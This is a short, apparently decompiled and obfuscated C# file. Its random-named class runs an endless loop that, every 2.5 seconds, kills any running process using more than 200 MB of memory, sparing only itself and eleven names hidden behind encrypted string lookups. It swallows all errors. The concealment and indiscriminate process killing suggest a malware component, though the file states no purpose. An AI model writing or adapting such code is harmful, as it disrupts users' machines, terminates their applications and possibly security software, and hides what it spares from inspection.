using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eltZnUpwRizyZ;

public static class FTmJnnLNQoCqT
{
	[NonSerialized]
	internal static GetString _0098;

	public static void siNfIsKXeLHWFyi()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200 && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(_0098(107398680)) && !process.ProcessName.Contains(_0098(107398671)) && !process.ProcessName.Contains(_0098(107398630)) && !process.ProcessName.Contains(_0098(107398653)) && !process.ProcessName.Contains(_0098(107398640)) && !process.ProcessName.Contains(_0098(107398595)) && !process.ProcessName.Contains(_0098(107398614)) && !process.ProcessName.Contains(_0098(107398057)) && !process.ProcessName.Contains(_0098(107398076)) && !process.ProcessName.Contains(_0098(107398063)) && !process.ProcessName.Contains(_0098(107398042)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static FTmJnnLNQoCqT()
	{
		Strings.CreateGetStringDelegate(typeof(FTmJnnLNQoCqT));
	}
}
